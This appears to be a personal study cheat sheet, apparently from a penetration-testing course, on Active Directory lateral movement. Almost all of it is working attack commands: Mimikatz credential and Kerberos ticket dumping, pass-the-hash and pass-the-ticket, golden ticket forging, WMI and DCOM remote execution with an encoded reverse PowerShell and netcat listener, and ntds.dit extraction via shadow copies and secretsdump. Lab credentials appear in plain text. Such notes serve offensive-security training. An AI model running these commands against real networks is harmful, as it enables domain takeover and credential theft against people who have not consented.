
| [[12 Active Directory-Lateral Movement#WMI & WinRM\|WMI & WinRM]]         | [[12 Active Directory-Lateral Movement#PSExec\|PsExec]]<br> | [[12 Active Directory-Lateral Movement#Pass-the-Hash (PtH)\|Pass-the-Hash (PtH)]] | [[12 Active Directory-Lateral Movement#Overpass the Hash\|Overpass the Hash]] |
| ---------------------------------------------------------------------- | -------------------------------------------------------- | ------------------------------------------------------------------------------ | -------------------------------------------------------------------------- |
| [[12 Active Directory-Lateral Movement#Pass The Ticket\|Pass The Ticket]] | [[12 Active Directory-Lateral Movement#DCOM\|DCOM]]         | [[12 Active Directory-Lateral Movement#Golden Ticket\|Golden Ticket]]             | [[12 Active Directory-Lateral Movement#Shadow Copies\|Shadow Copies]]         |
## WMI & WinRM
```powershell
### PowerShell WMIC Attack
# Store Credentials in PowerShell object
C:\Users\stephanie> $username='jen'; $password='Nexus123!';
C:\Users\stephanie> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force
C:\Users\stephanie> $credentials = New-Object System.Management.Automation.PSCredential $username,$secureString

# Create a Common Information Mode (CIM)
C:\Users\stephanie> $options = New-CimSessionOption -Protocol DCOM
C:\Users\stephanie> $session = NewCimsession -ComputerName <TARGET_IP> -Credential $credential -SessionOption $options

# Generate reverse powershell in encode.py and set command
kali@kali:~$ python3 encode.py # remember to change ip and port
C:\Users\stephanie> $command = '<encode.py output>'

# Prep listener on Kali
kali@kali:~$ nc -nvlp 4444

# Execute the code via Invoke CimMethod
C:\Users\stephanie> Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguemnts @{CommandLine=$command};

### WinRM via Windows Remote Shell (domain admin or remote management users)
C:\Users\stephanie> winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
# can replace cmd /c with reverse shell code

### PowerShell Remoting via PSSession
PS C:\Users\stephanie> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
PS C:\Users\stephanie> Enter-PSSession 1
```
## PSExec
```powershell
# Start interactive session on remote host via PsExec (inside SysinternalsSuite)
PS C:\Users\stephanie> .\PsExec64.exe -i \\FILES04 -u corp/jen -p Nexus123! cmd
```
### Pass-the-Hash (PtH)
```shell
# Refer to Password Pwning for more detail
kali@kali:~$ impacket-wmiexec -hashes :<NTLM_HASH> Administrator@192.168.50.73
# only works for AD domain accounts and built-in local admin account
```
## Overpass the Hash
```powershell
# When RDP-ed in, Shift Right-Click an application, Run as different user

# View cached credentials of that user on Mimikatz
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords

# Convert the NTLM hash into a Kerberos Ticket (TGT)
mimikatz> sekurlsa::pth /user:jen /domain:crop.com /ntlm:<NTLM_HASH> /run:powershell
# Creates powershell session, executes as jen but shows whoami as previous user since it does not inspect Kerberos tickets

# List the cached Kerberos tickets
PS C:\Users\stephanie> klist

# Execute interactive login to generate TGT
PS C:\Users\stephanie> net use \\files04

# View newly requested Kerberos tickets
PS C:\Users\stephanie> klist
# TGT ticket will have the server be krbtgt
# TGS ticket would have the server as CIFS (file server)

# Run PsExec to launch cmd remotely on files04
PS C:\Users\stephanie> .\PsExec.exe \\files04 cmd
```
## Pass The Ticket
```shell
# Export all TGT/TGS using Mimikatz
mimikatz> privilege::debug
mimikatz> sekurlsa::tickets /export

# View exported tickets
PS C:\Users\stephanie> dir *.kirbi

# Inject the TGS ticket into current session with Mimikatz
mimikatz> kerberos::ptt <TGS-file>

# Verify ticket injected
PS C:\Users\stephanie> klist
```
### DCOM
```powershell
# Instantiate a remote MMC2.0 application
PS C:\Users\stephanie> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))

# Utilize ExecuteShellCommand on the application object $dcom
PS C:\Users\stephanie> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
# Format: (<COMMAND>,<DIRECTORY>,<PARAMETERS>,<WINDOW_STATE>)

# Same thing but with Powershell script
PS C:\Users\stephanie> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e ...","7")
```
## Golden Ticket
```shell
# Requires krbtgt password hash

# Retrieve krbtgt password hash on DC1 (already have access)
mimikatz> privilege::debug
mimikatz> lsadump::lsa /patch

# Delete existing Kerberos tickets (if any)
mimikatz> kerberos::purge

# Create the golden ticket (using existing AD account)
mimikatz> kerberos::golden /user:jen /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /ptt

# PsExec.exe to enter
mimikatz> misc::cmd
C:\Users\stephanie> .\PsExec.exe \\dc1 cmd.exe
```
## Shadow Copies
```shell 
# Requires Domain Admin
C:\Users\stephanie> vshadow.exe -nw -p C:
# take note of shadow copy device name

# Copy entire AD database from the shadow copy
C:\Users\stephanie> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# Extract the SYSTEM hive
C:\Users\stephanie> reg.exe save hklm\system c:\system.bak

# Extract credentials after moving both files
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

# Better to move laterally to DC and execute DCSync attack with mimikatz
```